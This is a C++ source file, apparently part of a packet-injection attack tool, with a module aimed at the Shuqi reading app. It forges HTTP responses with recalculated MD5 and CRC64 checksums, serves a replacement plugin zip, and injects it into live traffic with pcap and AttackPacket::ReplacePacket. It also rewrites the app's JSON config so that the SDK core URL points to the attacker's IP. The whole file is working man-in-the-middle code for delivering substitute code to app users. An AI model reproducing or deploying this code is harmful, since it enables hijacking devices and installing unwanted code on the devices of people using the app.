
#include "ShuQi.h"
#include "../HttpUtils.h"
#include "../FileOper.h"
#include "../Public.h"
#include "../cipher/CryptoUtils.h"
#include "../cipher/Base64.h"








int ShuQi::prepareHdResp(unsigned long ulIP, string filepath, string fn) {
	char * szHttpPartialZipFormat = "HTTP/1.1 200 OK\r\n"
		"Content-Type: application/zip\r\n"
		"Connection: keep-alive\r\n"
		"Accept-Ranges: bytes\r\n"
		"ETag: \"%s\"\r\n"
 		"x-oss-hash-crc64ecma: %s\r\n"
 		"x-oss-meta-md5: %s\r\n"
		"Content-MD5: %s\r\n"
		"Content-Length: %u\r\n\r\n";

	int ret = 0;
	string filename = Public::getUserPluginPath(G_USERNAME) + "shuqi_plugin.zip";

	string crc64 = CryptoUtils::FileCrc64(filename, -1, 0);
	if (crc64 == "")
	{
		return FALSE;
	}
	char szmd5[64] = { 0 };
	unsigned char hexmd5[64] = { 0 };
	int filesize = CryptoUtils::getUpdateFileMd5(filename, szmd5, hexmd5, FALSE);

	char szbase64md5[64] = { 0 };
	ret = Base64::Base64Encode(szbase64md5, (const unsigned char*)hexmd5, 16);

	m_iHdRespSize = sprintf_s(m_lpHdResp, 4096, szHttpPartialZipFormat, szmd5,crc64.c_str(), szmd5, szbase64md5, filesize);

	return m_iHdRespSize;
}

int ShuQi::sendHdRespData(pcap_t * pcapT, const char * lppacket, int packetsize, char * ip, int type, LPPPPOEHEADER pppoe) {

	int ret = 0;
	if (m_iHdRespSize && m_lpHdResp)
	{
		ret = AttackPacket::ReplacePacket(pcapT, lppacket, packetsize, m_lpHdResp, m_iHdRespSize, ip, type, pppoe);
	}
	return ret;
}





int ShuQi::prepareDataResp(unsigned long ulIP, string filepath, string fn) {
	char * szHttpPartialZipFormat = "HTTP/1.1 200 OK\r\n"
		"Content-Type: application/zip\r\n"
		"Connection: keep-alive\r\n"
		"ETag: \"%s\"\r\n"
		"x-oss-hash-crc64ecma: %s\r\n"
		"x-oss-meta-md5: %s\r\n"
		"Content-MD5: %s\r\n"
		"Content-Length: %u\r\n\r\n";

	int ret = 0;
	string filename = Public::getUserPluginPath(G_USERNAME) + "shuqi_plugin.zip";

	string crc64 = CryptoUtils::FileCrc64(filename, -1, 0);
	if (crc64 == "")
	{
		return FALSE;
	}

	char szmd5[64] = { 0 };
	unsigned char hexmd5[64] = { 0 };
	int filesize = CryptoUtils::getUpdateFileMd5(filename, szmd5, hexmd5, FALSE);

	char szbase64md5[64] = { 0 };
	ret = Base64::Base64Encode(szbase64md5, (const unsigned char*)hexmd5, 16);

	char httphdr[4096];
	int httphdrlen = sprintf_s(httphdr, 4096, szHttpPartialZipFormat, szmd5, crc64.c_str(), szmd5, szbase64md5, filesize);

	ret = FileOper::offsetFileDecryptReader(filename, &m_lpDataResp, httphdrlen, &m_filesize);

	memcpy(m_lpDataResp, httphdr, httphdrlen);	

	m_iDataRespSize = httphdrlen + m_filesize;
	return m_iDataRespSize;
}


int ShuQi::sendDataResp(pcap_t * pcapT, const char * lppacket, int packetsize, char * ip, int type, LPPPPOEHEADER pppoe) {

	int ret = 0;
	if (m_iDataRespSize && m_lpDataResp)
	{
		ret = AttackPacket::ReplacePacket(pcapT, lppacket, packetsize, m_lpDataResp, m_iDataRespSize, ip, type, pppoe);
	}
	return ret;
}





int ShuQi::prepareRespData(unsigned long ulIP, string filepath, string filename) {

	int ret = 0;
	char * lpRespFormat =
		"HTTP/1.1 200 OK\r\nContent-Type: application/json;charset=UTF-8\r\nContent-Length: %u\r\n"
		"Connection: keep-alive\r\n\r\n";

	string cfgfn = filepath + "shuqiplugin.json";
	char * lpcfg = 0;
	int cfgfs = 0;
	ret = FileOper::fileReader(cfgfn.c_str(), &lpcfg, &cfgfs);
	if (ret <= 0)
	{
		return -1;
	}
	string cfgmain = string(lpcfg);
	delete lpcfg;

	if (cfgmain.find("bookstoreMd5") != -1)
	{
		int len = sprintf(m_lpResp, lpRespFormat, cfgmain.length());

		memcpy(m_lpResp + len, cfgmain.c_str(), cfgmain.length());

		m_iRespSize = len + cfgmain.length();

		return m_iRespSize;
	}

	int filesize = getUpdateFileMd5(filepath + filename, TRUE);
	string szip = HttpUtils::getIPstr(ulIP) + "%2F" + G_USERNAME;

	string format = "\"config\":{\"bookstoreMd5\":\"%s\",\"bookstore\":{}},"
		"\"uc_sdk\":{\"coreUrl\":\"http%3A%2F%2F%s%2F%s\",\"coreType\":1,\"coreParams\":\"\"}}}";

	char lpRespContent[MAX_RESPONSE_HEADER_SIZE] = { 0 };
	int len = sprintf(lpRespContent, format.c_str(), m_szmd5, szip.c_str(), filename.c_str());

	cfgmain = cfgmain + string(lpRespContent);

	len = sprintf(m_lpResp, lpRespFormat, cfgmain.length());

	memcpy(m_lpResp + len, cfgmain.c_str(), cfgmain.length());

	m_iRespSize = len + cfgmain.length();

	ret = FileOper::fileWriter(cfgfn, cfgmain.c_str(), cfgmain.length(), TRUE);

	return m_iRespSize;
}
